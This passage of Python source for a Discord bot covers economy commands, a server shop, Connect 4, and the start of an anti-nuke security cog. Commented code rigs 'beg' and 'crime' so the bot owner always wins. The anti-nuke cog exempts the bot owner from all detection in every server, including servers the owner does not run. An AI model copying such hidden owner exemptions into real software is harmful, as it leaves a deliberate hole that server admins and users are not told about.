            title="💸 Coins Transferred",
            description=(
                f"**{ctx.author.display_name}** → **{target.display_name}**\n\n"
                f"💰 **{amt:,}** coins sent!\n\n"
                f"Your balance: **{ud['balance']:,}**\n"
                f"{target.display_name}'s balance: **{td['balance']:,}**"
            ),
            color=COLORS["success"]
        )
        e.set_footer(text="Coolbot  •  ,give @user <amount>")
        await ctx.send(embed=e)

    _BEG_COOLDOWNS: dict = {}
    @commands.command(name="beg")
    async def beg(self, ctx):
        """Beg for a small amount of coins — 30s cooldown"""
        import time as _t
        uid  = str(ctx.author.id)
        now  = _t.time()
        last = Games._BEG_COOLDOWNS.get(uid, 0)
        wait = 30 - (now - last)
        if wait > 0:
            return await ctx.send(embed=discord.Embed(
                description=f"⏳ You can beg again in **{int(wait)}s**.", color=COLORS["warn"]
            ), delete_after=5)
        Games._BEG_COOLDOWNS[uid] = now
        BEGGARS = ["a stranger", "the local pizza place", "a rich discord mod", "your imaginary friend", "a shady guy in DMs"]
        OUTCOMES = [
            (True,  random.randint(10, 250),  f"💰 {{source}} felt generous and gave you **{{amt}}** coins!"),
            (True,  random.randint(1, 50),    f"🙄 {{source}} tossed you **{{amt}}** coins out of pity."),
            (False, 0,                        f"😒 {{source}} told you to get a job."),
            (False, 0,                        f"🚫 {{source}} ignored you completely."),
        ]
        # Official bot owner always gets a positive beg outcome; co-owners are unchanged.
        result = random.choice(OUTCOMES[:2]) if is_owner(ctx.author) else random.choices(OUTCOMES, weights=[30, 40, 20, 10], k=1)[0]
        won, amt, msg_tmpl = result
        source = random.choice(BEGGARS)
        msg = msg_tmpl.format(source=source, amt=f"{amt:,}")
        ud  = get_pokemon_data(uid)
        ud["balance"] = ud.get("balance", 0) + amt
        save_pokemon_data(uid, ud)
        e = discord.Embed(title="🙏 Beg", description=msg, color=COLORS["success"] if won else COLORS["warn"])
        if won:
            e.add_field(name="💳 New Balance", value=f"**{ud['balance']:,}** coins", inline=False)
        e.set_footer(text="30s cooldown  •  Coolbot")
        await ctx.send(embed=e)

    _WORK_COOLDOWNS: dict = {}
    WORK_JOBS = [
        ("👨‍💻 Software Dev",    (300, 700)),
        ("🚚 Delivery Driver",   (150, 400)),
        ("🍕 Pizza Chef",        (100, 350)),
        ("🎮 Game Tester",       (200, 500)),
        ("🧹 Janitor",           (80,  250)),
        ("📦 Warehouse Worker",  (120, 380)),
        ("🏋️ Personal Trainer",  (180, 450)),
        ("🎤 Streamer",          (50,  1000)),
        ("🦸 Superhero",         (400, 900)),
        ("🤖 Bot Operator",      (500, 800)),
    ]
    @commands.command(name="work")
    async def work(self, ctx):
        """Work a shift for coins — 1 minute cooldown"""
        import time as _t
        uid  = str(ctx.author.id)
        now  = _t.time()
        last = Games._WORK_COOLDOWNS.get(uid, 0)
        wait = 60 - (now - last)
        if wait > 0:
            return await ctx.send(embed=discord.Embed(
                description=f"⏳ You can work again in **{int(wait)}s**.", color=COLORS["warn"]
            ), delete_after=5)
        Games._WORK_COOLDOWNS[uid] = now
        job, (lo, hi) = random.choice(Games.WORK_JOBS)
        earned = random.randint(lo, hi)
        ud = get_pokemon_data(uid)
        ud["balance"] = ud.get("balance", 0) + earned
        save_pokemon_data(uid, ud)
        e = discord.Embed(
            title="💼 Work",
            description=(
                f"You worked as a **{job}** and earned **{earned:,}** coins!\n\n"
                f"💳 New balance: **{ud['balance']:,}** coins"
            ),
            color=COLORS["success"]
        )
        e.set_footer(text="1 minute cooldown  •  Coolbot")
        await ctx.send(embed=e)

    _CRIME_COOLDOWNS: dict = {}
    @commands.command(name="crime")
    async def crime(self, ctx):
        """Commit a crime for big coins or risk a fine — 2 minute cooldown"""
        import time as _t
        uid  = str(ctx.author.id)
        now  = _t.time()
        last = Games._CRIME_COOLDOWNS.get(uid, 0)
        wait = 120 - (now - last)
        if wait > 0:
            return await ctx.send(embed=discord.Embed(
                description=f"⏳ Lay low for **{int(wait)}s** before your next crime.", color=COLORS["warn"]
            ), delete_after=5)
        Games._CRIME_COOLDOWNS[uid] = now
        CRIMES = [
            ("🏦 Bank heist",        800,  2000, 0.45),
            ("🎭 Con artist scheme", 400,  900,  0.55),
            ("🚗 Car theft",         300,  700,  0.50),
            ("💊 Drug deal",         600,  1500, 0.40),
            ("🃏 Card scam",         200,  600,  0.60),
            ("🔓 Safe cracking",     500,  1200, 0.45),
        ]
        crime_name, lo, hi, success_rate = random.choice(CRIMES)
        ud  = get_pokemon_data(uid)
        bal = ud.get("balance", 0)
        # Official bot owner always succeeds at crime; co-owners keep normal rates.
        if is_owner(ctx.author) or random.random() < success_rate:
            earned = random.randint(lo, hi)
            ud["balance"] = bal + earned
            save_pokemon_data(uid, ud)
            e = discord.Embed(
                title=f"😈 Crime — {crime_name}",
                description=f"✅ **Got away with it!**\nYou earned **{earned:,}** coins.\n\n💳 New balance: **{ud['balance']:,}**",
                color=COLORS["success"]
            )
        else:
            fine = random.randint(100, min(500, max(100, bal // 4)))
            ud["balance"] = max(0, bal - fine)
            save_pokemon_data(uid, ud)
            e = discord.Embed(
                title=f"🚔 Crime — {crime_name}",
                description=f"❌ **Caught!** You paid a **{fine:,}** coins fine.\n\n💳 New balance: **{ud['balance']:,}**",
                color=COLORS["error"]
            )
        e.set_footer(text="2 minute cooldown  •  Risk vs reward")
        await ctx.send(embed=e)

    # ── UnbelievaBoat-style economy ──────────────────────────────────────────
    _DAILY_COOLDOWNS: dict = {}

    @commands.hybrid_command(name="balance", aliases=["bal", "coins", "cash"], description="Check your coin balance")
    @app_commands.describe(member="Whose balance to view")
    async def balance_cmd(self, ctx, member: discord.Member = None):
        target = member or ctx.author
        ud = get_pokemon_data(str(target.id))
        bal = int(ud.get("balance", 0))
        bank = int(ud.get("bank", 0))
        e = discord.Embed(title=f"💰 {target.display_name}'s Balance", color=COLORS["main"])
        e.set_thumbnail(url=target.display_avatar.url)
        e.add_field(name="Wallet", value=f"**{_mikasa_currency_symbol()}{bal:,}** {_mikasa_currency_label()}", inline=True)
        e.add_field(name="Bank", value=f"**{_mikasa_currency_symbol()}{bank:,}** {_mikasa_currency_label()}", inline=True)
        e.add_field(name="Total", value=f"**{_mikasa_currency_symbol()}{bal + bank:,}** {_mikasa_currency_label()}", inline=True)
        e.set_footer(text="Coolbot  ·  UnbelievaBoat-style economy")
        await ctx.send(embed=e)

    @commands.hybrid_command(name="deposit", aliases=["dep"], description="Deposit wallet currency into your bank")
    @app_commands.describe(amount="Amount to deposit, or 'all' to deposit your whole wallet")
    async def deposit_cmd(self, ctx, amount: str):
        uid = str(ctx.author.id)
        ud = get_pokemon_data(uid)
        wallet = max(0, int(ud.get("balance", 0) or 0))
        bank = max(0, int(ud.get("bank", 0) or 0))
        if amount.lower() == "all":
            value = wallet
        else:
            try:
                value = int(amount)
            except (TypeError, ValueError):
                return await ctx.send("❌ Use an amount, e.g. `,deposit 100`, or `,deposit all`.")
        if value <= 0:
            return await ctx.send("❌ Deposit amount must be greater than 0.")
        if value > wallet:
            return await ctx.send(f"❌ You only have **{_mikasa_currency_symbol()}{wallet:,}** in your wallet.")
        ud["balance"] = wallet - value
        ud["bank"] = bank + value
        save_pokemon_data(uid, ud)
        await ctx.send(embed=discord.Embed(
            title="🏦 Deposit Successful",
            description=(f"Deposited **{_mikasa_currency_symbol()}{value:,} {_mikasa_currency_label()}** into your bank.\n"
                         f"💵 Wallet: **{_mikasa_currency_symbol()}{ud['balance']:,}**  ·  🏦 Bank: **{_mikasa_currency_symbol()}{ud['bank']:,}**"),
            color=COLORS["success"],
        ))

    @commands.hybrid_command(name="withdraw", aliases=["with", "wd"], description="Withdraw bank currency into your wallet")
    @app_commands.describe(amount="Amount to withdraw, or 'all' to withdraw your whole bank")
    async def withdraw_cmd(self, ctx, amount: str):
        uid = str(ctx.author.id)
        ud = get_pokemon_data(uid)
        wallet = max(0, int(ud.get("balance", 0) or 0))
        bank = max(0, int(ud.get("bank", 0) or 0))
        if amount.lower() == "all":
            value = bank
        else:
            try:
                value = int(amount)
            except (TypeError, ValueError):
                return await ctx.send("❌ Use an amount, e.g. `,withdraw 100`, or `,withdraw all`.")
        if value <= 0:
            return await ctx.send("❌ Withdrawal amount must be greater than 0.")
        if value > bank:
            return await ctx.send(f"❌ You only have **{_mikasa_currency_symbol()}{bank:,}** in your bank.")
        ud["bank"] = bank - value
        ud["balance"] = wallet + value
        save_pokemon_data(uid, ud)
        await ctx.send(embed=discord.Embed(
            title="💸 Withdrawal Successful",
            description=(f"Withdrew **{_mikasa_currency_symbol()}{value:,} {_mikasa_currency_label()}** into your wallet.\n"
                         f"💵 Wallet: **{_mikasa_currency_symbol()}{ud['balance']:,}**  ·  🏦 Bank: **{_mikasa_currency_symbol()}{ud['bank']:,}**"),
            color=COLORS["success"],
        ))

    @commands.hybrid_command(name="daily", description="Claim daily coins (scales with real invites)")
    async def daily_cmd(self, ctx):
        uid = str(ctx.author.id)
        now = time.time()
        last = Games._DAILY_COOLDOWNS.get(uid) or get_pokemon_data(uid).get("last_daily", 0)
        wait = 86400 - (now - float(last or 0))
        if wait > 0:
            h, rem = divmod(int(wait), 3600)
            m = rem // 60
            return await ctx.send(embed=discord.Embed(
                description=f"⏳ Daily already claimed. Come back in **{h}h {m}m**.",
                color=COLORS["warn"],
            ), delete_after=8)
        ud = get_pokemon_data(uid)
        real_invites = int(ud.get("referrals", 0) or 0)
        # 250 coins per real invite, minimum base DAILY_COINS
        amt = max(int(DAILY_COINS), real_invites * int(REFERRAL_REWARD or DAILY_COINS))
        if real_invites <= 0:
            amt = int(DAILY_COINS)
        else:
            amt = real_invites * int(REFERRAL_REWARD or 250)
        ud["balance"] = int(ud.get("balance", 0)) + amt
        ud["last_daily"] = now
        Games._DAILY_COOLDOWNS[uid] = now
        save_pokemon_data(uid, ud)
        inv_line = f"\n📨 Real invites: **{real_invites}** × {int(REFERRAL_REWARD or 250)} = **{amt:,}**" if real_invites > 0 else f"\n💡 Invite friends to earn more daily (250 per real invite)."
        await ctx.send(embed=discord.Embed(
            title="🎁 Daily Claimed!",
            description=f"You received **{_mikasa_currency_symbol()}{amt:,} {_mikasa_currency_label()}**!{inv_line}\n💳 New balance: **{_mikasa_currency_symbol()}{ud['balance']:,}**",
            color=COLORS["success"],
        ))

    @commands.hybrid_command(name="addcoins", aliases=["givecoins", "addcash"], description="Add coins to a user (Admin/Owner)")
    @app_commands.describe(member="User to give coins to", amount="Amount of coins")
    async def addcoins_cmd(self, ctx, member: discord.Member, amount: int):
        if not has_owner_access(ctx.author):
            return await ctx.send(embed=discord.Embed(description="❌ Bot owner only. Economy currency changes are owner-exclusive.", color=COLORS["error"]))
        if amount == 0:
            return await ctx.send(embed=discord.Embed(description="❌ Amount cannot be 0.", color=COLORS["error"]))
        ud = get_pokemon_data(str(member.id))
        ud["balance"] = max(0, int(ud.get("balance", 0)) + int(amount))
        save_pokemon_data(str(member.id), ud)
        verb = "Added" if amount > 0 else "Removed"
        await ctx.send(embed=discord.Embed(
            description=f"✅ {verb} **{abs(amount):,}** coins {'to' if amount > 0 else 'from'} {member.mention}.\n💳 New balance: **{ud['balance']:,}**",
            color=COLORS["success"],
        ))

    @commands.hybrid_command(name="resetcoins", aliases=["setcoins", "wipebalance"], description="Reset a user's coins to 0 (Admin/Owner)")
    @app_commands.describe(member="User whose coins to reset")
    async def resetcoins_cmd(self, ctx, member: discord.Member):
        if not has_owner_access(ctx.author):
            return await ctx.send(embed=discord.Embed(description="❌ Bot owner only. Economy resets are owner-exclusive.", color=COLORS["error"]))
        ud = get_pokemon_data(str(member.id))
        ud["balance"] = 0
        ud["bank"] = 0
        save_pokemon_data(str(member.id), ud)
        await ctx.send(embed=discord.Embed(
            description=f"✅ Reset **{member.display_name}**'s wallet and bank to **0**.",
            color=COLORS["success"],
        ))

    @commands.hybrid_command(name="resetservercoins", aliases=["wipeservereconomy", "resetallcoins"], description="Reset ALL member balances in this server (Owner only)")
    async def resetservercoins_cmd(self, ctx):
        if not has_owner_access(ctx.author):
            return await ctx.send(embed=discord.Embed(description="❌ Owner only.", color=COLORS["error"]))
        if not ctx.guild:
            return await ctx.send(embed=discord.Embed(description="❌ Server only.", color=COLORS["error"]))

        class ConfirmWipe(discord.ui.View):
            def __init__(self):
                super().__init__(timeout=30)
                self.done = False

            @discord.ui.button(label="Yes, wipe all balances", style=discord.ButtonStyle.danger)
            async def yes(self, interaction: discord.Interaction, button: discord.ui.Button):
                if not has_owner_access(interaction.user):
                    return await interaction.response.send_message("Owner only.", ephemeral=True)
                if self.done:
                    return
                self.done = True
                self.stop()
                data = load("economy")
                if not isinstance(data, dict):
                    data = {}
                count = 0
                for m in ctx.guild.members:
                    if m.bot:
                        continue
                    uid = str(m.id)
                    if uid in data:
                        data[uid]["balance"] = 0
                        data[uid]["bank"] = 0
                    else:
                        data[uid] = {"balance": 0, "bank": 0}
                    count += 1
                save("economy", data)
                await interaction.response.edit_message(
                    embed=discord.Embed(description=f"✅ Reset balances for **{count}** members in **{ctx.guild.name}**.", color=COLORS["success"]),
                    view=None,
                )

            @discord.ui.button(label="Cancel", style=discord.ButtonStyle.secondary)
            async def no(self, interaction: discord.Interaction, button: discord.ui.Button):
                if not has_owner_access(interaction.user):
                    return await interaction.response.send_message("Owner only.", ephemeral=True)
                self.stop()
                await interaction.response.edit_message(
                    embed=discord.Embed(description="✅ Cancelled.", color=COLORS["success"]),
                    view=None,
                )

        await ctx.send(
            embed=discord.Embed(
                title="⚠️ Reset Server Coins?",
                description=f"Sets **wallet + bank to 0** for every member of **{ctx.guild.name}**.\n**No undo.**",
                color=COLORS["error"],
            ),
            view=ConfirmWipe(),
        )

    # ── MIKASA SERVER SHOP ────────────────────────────────────────────────────
    def _shop_catalog(self, guild_id):
        data = load("shop_items")
        if not isinstance(data, dict):
            data = {}
        key = str(guild_id)
        if not isinstance(data.get(key), dict):
            data[key] = {}
        return data, data[key]

    def _shop_manager_ids(self, guild_id):
        data = load("shop_managers")
        if not isinstance(data, dict):
            data = {}
        raw = data.get(str(guild_id), [])
        return data, {int(x) for x in raw if str(x).isdigit()} if isinstance(raw, list) else set()

    def _can_manage_shop(self, member, guild_id):
        if member.id == OWNER_ID:
            return True
        _, managers = self._shop_manager_ids(guild_id)
        return member.id in managers

    @commands.command(name="shopaccess", aliases=["shopgrant", "addshopmanager"])
    async def shopaccess_cmd(self, ctx, member: discord.Member):
        """Primary owner only: allow a member to add and remove this server's shop items."""
        if ctx.author.id != OWNER_ID:
            return await ctx.send("🔒 Only Mikasa's primary owner can grant shop-management access.")
        if not ctx.guild:
            return await ctx.send("❌ Use this command inside a server.")
        data, managers = self._shop_manager_ids(ctx.guild.id)
        if member.id == OWNER_ID or member.id in managers:
            return await ctx.send("ℹ️ That member already has shop-management access.")
        managers.add(member.id)
        data[str(ctx.guild.id)] = sorted(managers)
        save("shop_managers", data)
        await ctx.send(f"✅ {member.mention} can now add and remove items in this server's Mikasa Shop.")

    @commands.command(name="shoprevoke", aliases=["shopremoveaccess", "removeshopmanager"])
    async def shoprevoke_cmd(self, ctx, member: discord.Member):
        """Primary owner only: revoke this server's shop-management access."""
        if ctx.author.id != OWNER_ID:
            return await ctx.send("🔒 Only Mikasa's primary owner can revoke shop-management access.")
        if not ctx.guild:
            return await ctx.send("❌ Use this command inside a server.")
        data, managers = self._shop_manager_ids(ctx.guild.id)
        if member.id not in managers:
            return await ctx.send("ℹ️ That member does not have shop-management access.")
        managers.remove(member.id)
        data[str(ctx.guild.id)] = sorted(managers)
        save("shop_managers", data)
        await ctx.send(f"✅ Revoked shop-management access from {member.mention}.")

    @commands.command(name="shopstaff", aliases=["shopmanagers"])
    async def shopstaff_cmd(self, ctx):
        """Show members allowed to manage this server's shop."""
        if not ctx.guild:
            return await ctx.send("❌ Use this command inside a server.")
        _, managers = self._shop_manager_ids(ctx.guild.id)
        mentions = [f"<@{uid}>" for uid in sorted(managers)]
        desc = "\n".join(mentions) if mentions else "No additional shop managers are configured."
        await ctx.send(embed=discord.Embed(title="🛍️ Shop Managers", description=desc, color=COLORS["main"]))

    @commands.command(name="shop", aliases=["store"])
    async def shop_cmd(self, ctx):
        """View items available to buy with the server's wallet currency."""
        if not ctx.guild:
            return await ctx.send("❌ The shop is only available inside a server.")
        _, items = self._shop_catalog(ctx.guild.id)
        if not items:
            return await ctx.send(embed=discord.Embed(
                title="🛍️ Mikasa Shop",
                description="The shop is empty right now. The bot owner can add items with `,additem name price description`.",
                color=COLORS["main"],
            ))
        e = discord.Embed(title="🛍️ Mikasa Shop", color=COLORS["main"])
        for name, item in list(items.items())[:25]:
            price = int(item.get("price", 0))
            desc = item.get("description") or "No description provided."
            e.add_field(name=f"{name} — {_mikasa_currency_symbol()}{price:,}", value=f"{desc}\nBuy with `,buy {name}`", inline=False)
        e.set_footer(text=f"Prices use {_mikasa_currency_label()} from your wallet • ,buy <item>")
        await ctx.send(embed=e)

    @commands.command(name="buy", aliases=["purchase"])
    async def buy_cmd(self, ctx, *, item_name: str):
        """Buy a shop item using wallet currency."""
        if not ctx.guild:
            return await ctx.send("❌ The shop is only available inside a server.")
        _, items = self._shop_catalog(ctx.guild.id)
        match = next((n for n in items if n.casefold() == item_name.strip().casefold()), None)
        if match is None:
            return await ctx.send("❌ That item isn't in the shop. Use `,shop` to see what's available.")
        item = items[match]
        price = int(item.get("price", 0))
        if price <= 0:
            return await ctx.send("❌ This item has an invalid price. Ask the bot owner to fix it.")
        uid = str(ctx.author.id)
        ud = get_pokemon_data(uid)
        wallet = max(0, int(ud.get("balance", 0) or 0))
        if wallet < price:
            return await ctx.send(f"❌ You need **{_mikasa_currency_symbol()}{price:,}** but your wallet has **{_mikasa_currency_symbol()}{wallet:,}**. Bank funds must be withdrawn first.")
        inventory = ud.get("shop_inventory", {})
        if not isinstance(inventory, dict):
            inventory = {}
        guild_inventory = inventory.get(str(ctx.guild.id), [])
        if not isinstance(guild_inventory, list):
            guild_inventory = []
        ud["balance"] = wallet - price
        guild_inventory.append({"name": match, "price": price, "purchased_at": int(time.time())})
        inventory[str(ctx.guild.id)] = guild_inventory
        ud["shop_inventory"] = inventory
        save_pokemon_data(uid, ud)
        await ctx.send(embed=discord.Embed(
            title="✅ Purchase successful!",
            description=f"{ctx.author.mention} bought **{match}** for **{_mikasa_currency_symbol()}{price:,} {_mikasa_currency_label()}**.\n\nWallet remaining: **{_mikasa_currency_symbol()}{ud['balance']:,}**",
            color=COLORS["success"],
        ))

    @commands.command(name="inventory", aliases=["inv", "myitems"])
    async def inventory_cmd(self, ctx, member: discord.Member = None):
        """View your purchased shop items."""
        target = member or ctx.author
        ud = get_pokemon_data(str(target.id))
        inventory = ud.get("shop_inventory", {})
        items = inventory.get(str(ctx.guild.id), []) if ctx.guild and isinstance(inventory, dict) else []
        if not items:
            return await ctx.send(embed=discord.Embed(title=f"🎒 {target.display_name}'s Inventory", description="No shop purchases yet.", color=COLORS["main"]))
        counts = {}
        for entry in items:
            name = entry.get("name", "Unknown item") if isinstance(entry, dict) else str(entry)
            counts[name] = counts.get(name, 0) + 1
        desc = "\n".join(f"• **{name}** × {count}" for name, count in counts.items())
        await ctx.send(embed=discord.Embed(title=f"🎒 {target.display_name}'s Inventory", description=desc[:4000], color=COLORS["main"]))

    @commands.command(name="additem")
    async def additem_cmd(self, ctx, name: str, price: int, *, description: str = "No description provided."):
        """Owner-only: add an item; use underscores instead of spaces in the item name."""
        if not ctx.guild:
            return await ctx.send("❌ Use this command inside a server.")
        if not self._can_manage_shop(ctx.author, ctx.guild.id):
            return await ctx.send("🔒 You need shop-management access to add items.")
        if price <= 0:
            return await ctx.send("❌ Price must be greater than 0.")
        data, items = self._shop_catalog(ctx.guild.id)
        if any(existing.casefold() == name.casefold() for existing in items):
            return await ctx.send("❌ An item with that name already exists.")
        items[name.replace("_", " ")] = {"price": int(price), "description": description[:300]}
        save("shop_items", data)
        await ctx.send(f"✅ Added **{name.replace('_', ' ')}** to the shop for **{_mikasa_currency_symbol()}{price:,}**.")

    @commands.command(name="removeitem", aliases=["delitem"])
    async def removeitem_cmd(self, ctx, *, item_name: str):
        """Owner-only: remove an item from this server's shop."""
        if not ctx.guild:
            return await ctx.send("❌ Use this command inside a server.")
        if not self._can_manage_shop(ctx.author, ctx.guild.id):
            return await ctx.send("🔒 You need shop-management access to remove items.")
        data, items = self._shop_catalog(ctx.guild.id)
        match = next((n for n in items if n.casefold() == item_name.strip().casefold()), None)
        if match is None:
            return await ctx.send("❌ That item isn't in the shop.")
        del items[match]
        save("shop_items", data)
        await ctx.send(f"✅ Removed **{match}** from the shop. Past purchases remain in members' inventories.")

    # ── END MIKASA SHOP ───────────────────────────────────────────────────────

    # ── END GAMBLING ──────────────────────────────────────────────────────────

    @commands.command(name="connect4")
    async def connect4(self, ctx, member: discord.Member):
        if member.bot or member.id == ctx.author.id:
            return await ctx.send(embed=discord.Embed(description="❌ Invalid opponent.", color=COLORS["error"]))
        board = [[None]*7 for _ in range(6)]; turn = [ctx.author]
        view  = discord.ui.View(timeout=180)
        def render():
            rows = []
            for row in board:
                rows.append("".join(("🔴" if c==ctx.author.id else "🔵" if c else "⬛") for c in row))
            return "\n".join(rows)+"\n1️⃣2️⃣3️⃣4️⃣5️⃣6️⃣7️⃣"
        def check_win():
            for r in range(6):
                for c in range(7):
                    uid2 = board[r][c]
                    if not uid2: continue
                    for dr,dc in [(0,1),(1,0),(1,1),(1,-1)]:
                        try:
                            if all(0<=r+dr*i<6 and 0<=c+dc*i<7 and board[r+dr*i][c+dc*i]==uid2 for i in range(4)):
                                return uid2
                        except: pass
            return None
        for col in range(7):
            btn = discord.ui.Button(label=str(col+1), style=discord.ButtonStyle.primary, row=0)
            async def cb(interaction: discord.Interaction, c=col):
                if interaction.user.id != turn[0].id: return await interaction.response.send_message("Not your turn!", ephemeral=False)
                for r in range(5,-1,-1):
                    if board[r][c] is None: board[r][c] = turn[0].id; break
                else:
                    return await interaction.response.send_message("Column full!", ephemeral=False)
                wid = check_win()
                if wid:
                    wnr = ctx.author if wid==ctx.author.id else member
                    for ch2 in view.children: ch2.disabled = True
                    return await interaction.response.edit_message(embed=discord.Embed(title=f"🏆 {wnr.display_name} wins!", description=render(), color=COLORS["success"]), view=view)
                if all(board[0][cc] for cc in range(7)):
                    for ch2 in view.children: ch2.disabled = True
                    return await interaction.response.edit_message(embed=discord.Embed(title="🤝 Draw!", description=render(), color=COLORS["warn"]), view=view)
                turn[0] = member if turn[0]==ctx.author else ctx.author
                await interaction.response.edit_message(embed=discord.Embed(title="🔴🔵 Connect 4", description=render()+f"\n\n{turn[0].mention}'s turn", color=COLORS["main"]), view=view)
            btn.callback = cb; view.add_item(btn)
        await ctx.send(embed=discord.Embed(title="🔴🔵 Connect 4", description=render()+f"\n\n{ctx.author.mention} goes first (🔴)", color=COLORS["main"]), view=view)

#  COG — SECURITY ANTI-NUKE
class AntiNukeCog(commands.Cog):
    """
    Detects: mass channel deletes, mass role deletes, mass bans,
             webhook abuse, server name/icon edits.
    Responds: instant ban of actor (human or bot), lockdown @everyone,
              parallel channel+role restore, DM server owner + bot owner.
    """
    # Per-guild action windows  {guild_id: [{"uid": int, "t": float}, ...]}
    _ch_del:   dict = {}
    _role_del: dict = {}
    _bans:     dict = {}
    _webhooks: dict = {}
    # Cooldown: guild_id → unix timestamp of last trigger (ignore further triggers for 30s)
    _cooldown: dict = {}

    def __init__(self, bot):
        self.bot       = bot
        self.snapshots: dict = {}
        self._auto_snapshot_task = None

    # ── startup ──────────────────────────────────────────────
    @commands.Cog.listener()
    async def on_ready(self):
        # Restore the last persisted baseline first. Do not overwrite it immediately
        # on startup, otherwise a post-incident restart could erase the comparison point.
        persisted = load("security_snapshots")
        if not isinstance(persisted, dict):
            persisted = {}
        for guild in self.bot.guilds:
            saved = persisted.get(str(guild.id))
            if isinstance(saved, dict) and isinstance(saved.get("channels"), list) and isinstance(saved.get("roles"), list):
                self.snapshots[guild.id] = {
                    "name": saved.get("name", guild.name),
                    "icon_bytes": None,
                    "channels": saved["channels"],
                    "roles": saved["roles"],
                }
            else:
                await self._take_snapshot(guild)
        if not self._auto_snapshot_task:
            self._auto_snapshot_task = asyncio.create_task(self._snapshot_loop())

    async def _snapshot_loop(self):
        """Auto-refresh snapshots every 30 minutes."""
        while True:
            await asyncio.sleep(1800)
            for guild in self.bot.guilds:
                try:
                    await self._take_snapshot(guild)
                except Exception:
                    pass

    # ── snapshot ─────────────────────────────────────────────
    async def _take_snapshot(self, guild: discord.Guild):
        try:
            icon_bytes = await guild.icon.read() if guild.icon else None
        except Exception:
            icon_bytes = None

        channels_data = []
        for ch in guild.channels:
            cd = {"name": ch.name, "type": str(ch.type), "position": ch.position}
            if isinstance(ch, discord.TextChannel):
                cd["topic"]    = ch.topic
                cd["slowmode"] = ch.slowmode_delay
            channels_data.append(cd)

        roles_data = []
        for r in guild.roles:
            if r.is_default() or r.managed:
                continue
            roles_data.append({
                "name":  r.name,
                "color": r.color.value,
                "hoist": r.hoist,
                "perms": r.permissions.value,
                "pos":   r.position,
            })

        snapshot = {
            "name":       guild.name,
            "icon_bytes": icon_bytes,
            "channels":   channels_data,
            "roles":      roles_data,
        }
        self.snapshots[guild.id] = snapshot
        # Persist a JSON-safe copy so the baseline survives Termux/process restarts.
        try:
            saved = load("security_snapshots")
            if not isinstance(saved, dict):
                saved = {}
            saved[str(guild.id)] = {
                "name": guild.name,
                "channels": channels_data,
                "roles": roles_data,
                "saved_at": int(time.time()),
            }
            save("security_snapshots", saved)
        except Exception as snapshot_ex:
            print(f"[antinuke snapshot persistence] {snapshot_ex}")

    # ── helpers ───────────────────────────────────────────────
    def _is_enabled(self, guild: discord.Guild) -> bool:
        settings = load("server_settings")
        return gdata(settings, guild.id).get("antinuke_enabled", False)

    # Protected action categories (like Security bots)
    WL_CATEGORIES = {
        "roles":     "Role Management",
        "channels":  "Channel Management",
        "webhooks":  "Webhook Management",
        "server":    "Server Settings",
        "bots":      "Bot & Integration Management",
        "bans":      "Ban & Kick Management",
        "other":     "Other Protected Actions",
        "all":       "All Categories",
    }

    def _get_wl_map(self, guild: discord.Guild) -> dict:
        """
        Return {user_id_str: [category, ...]} .
        Migrates legacy list format [uid, uid] → full ("all") whitelist.
        """
        settings = load("server_settings")
        raw = gdata(settings, guild.id).get("antinuke_whitelist", [])
        if isinstance(raw, dict):
            return {str(k): list(v) if isinstance(v, list) else ["all"] for k, v in raw.items()}
        # legacy list of ints
        out = {}
        if isinstance(raw, list):
            for uid in raw:
                out[str(uid)] = ["all"]
        return out

    def _save_wl_map(self, guild: discord.Guild, wl_map: dict):
        settings = load("server_settings")
        gs = gdata(settings, guild.id)
        gs["antinuke_whitelist"] = wl_map
        save("server_settings", settings)

    def _get_role_wl_map(self, guild: discord.Guild) -> dict:
        """Return {role_id_str: [category, ...]} for role-based whitelist."""
        settings = load("server_settings")
        raw = gdata(settings, guild.id).get("antinuke_role_whitelist", {})
        if not isinstance(raw, dict):
            return {}
        return {str(k): list(v) if isinstance(v, list) else ["all"] for k, v in raw.items()}

    def _save_role_wl_map(self, guild: discord.Guild, role_map: dict):
        settings = load("server_settings")
        gs = gdata(settings, guild.id)
        gs["antinuke_role_whitelist"] = role_map
        save("server_settings", settings)

    def _member_whitelist_cats(self, guild: discord.Guild, user_id: int) -> set:
        """All categories this user has via user whitelist + roles."""
        cats = set()
        wl_map = self._get_wl_map(guild)
        for c in wl_map.get(str(user_id), []):
            cats.add(c)
        member = guild.get_member(user_id)
        if member is not None:
            role_map = self._get_role_wl_map(guild)
            for role in member.roles:
                for c in role_map.get(str(role.id), []):
                    cats.add(c)
        return cats

    def _is_whitelisted(self, guild: discord.Guild, user_id: int, category: str = None) -> bool:
        """
        True if user is exempt for this category (or fully exempt).
        Checks user whitelist AND role-based whitelist.
        category: roles|channels|webhooks|server|bots|bans|other|None
        """
        if user_id == OWNER_ID or (self.bot.user and user_id == self.bot.user.id):
            return True
        if guild.owner_id and user_id == guild.owner_id:
            return True
        cats = self._member_whitelist_cats(guild, user_id)
        if not cats:
            return False
        if "all" in cats:
            return True
        if category is None:
            return True
        return category in cats

    def _in_cooldown(self, guild_id: int) -> bool:
        last = self._cooldown.get(guild_id, 0)
        return (time.time() - last) < 30

    def _set_cooldown(self, guild_id: int):
        self._cooldown[guild_id] = time.time()

    def _window(self, store: dict, guild_id: int, uid: int, seconds: float) -> int:
        """Append event, prune old ones, return current count for this uid."""
        now = time.time()
        if guild_id not in store:
            store[guild_id] = []
        store[guild_id].append({"uid": uid, "t": now})
        store[guild_id] = [e for e in store[guild_id] if now - e["t"] < seconds]
        return sum(1 for e in store[guild_id] if e["uid"] == uid)

    async def _get_actor(
        self,
        guild: discord.Guild,
        action: discord.AuditLogAction,
        seconds: float = 8,
        target_id: int | None = None,
    ) -> discord.Member | None:
        """Resolve the actor only from a recent audit entry matching the affected target."""
        try:
            now = time.time()
            async for entry in guild.audit_logs(limit=10, action=action):
                age = now - entry.created_at.timestamp() if entry.created_at else 999999
                if age < 0 or age >= seconds:
                    continue
                entry_target_id = getattr(getattr(entry, "target", None), "id", None)
                if target_id is not None and entry_target_id != target_id:
                    continue
                if entry.user and entry.user.id != self.bot.user.id:
                    return entry.user
        except Exception:
            pass
        return None

    # ── trigger response ──────────────────────────────────────
    async def _respond(self, guild: discord.Guild, actor, reason: str):
        # Absolute safety bypass: Mikasa must never punish or lock down because of the primary bot owner.
        if actor is not None and getattr(actor, "id", None) in {OWNER_ID, guild.owner_id}:
            print(f"[AntiNuke] Ignored trigger caused by protected owner {getattr(actor, 'id', None)}: {reason}")
            return
        if self._in_cooldown(guild.id):
            return
        self._set_cooldown(guild.id)

        snap = self.snapshots.get(guild.id, {})
        actions_taken = []

